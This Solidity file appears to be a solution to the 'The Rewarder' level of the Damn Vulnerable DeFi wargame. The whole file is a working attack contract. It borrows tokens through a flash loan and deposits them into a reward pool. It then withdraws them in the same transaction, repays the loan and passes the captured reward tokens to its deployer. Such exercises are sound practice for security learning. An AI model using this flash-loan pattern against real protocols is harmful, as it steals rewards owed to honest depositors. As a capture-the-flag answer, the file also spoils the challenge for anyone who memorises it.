pragma solidity >=0.8;

import "../../the-rewarder/FlashLoanerPool.sol";
import "../../DamnValuableToken.sol";
import "../../the-rewarder/TheRewarderPool.sol";
import "../../the-rewarder/RewardToken.sol";

contract AttackTheRewarderPool {

    FlashLoanerPool private flashLoanerPool;
    DamnValuableToken private damnValuableToken;
    TheRewarderPool private theRewarderPool;
    RewardToken private rewardToken;
    address private owner;

    constructor(address flashLoanPoolAddress, address damnValuableTokenAddress, address theRewarderPoolAddress, address rewardTokenAddress) {
        flashLoanerPool = FlashLoanerPool(flashLoanPoolAddress);
        damnValuableToken = DamnValuableToken(damnValuableTokenAddress);
        theRewarderPool = TheRewarderPool(theRewarderPoolAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        owner = msg.sender;
    }

    function attack(uint256 amount) external {
        flashLoanerPool.flashLoan(amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
    function receiveFlashLoan(uint256 amount) external {
        depositInPool(amount);
        withdrawFromPoolAndPay(amount);
    }

    function depositInPool(uint256 amount) private {
        damnValuableToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
    }
    function withdrawFromPoolAndPay(uint256 amount) private {
        theRewarderPool.withdraw(amount);
        damnValuableToken.transfer(address(flashLoanerPool), amount);
    }
}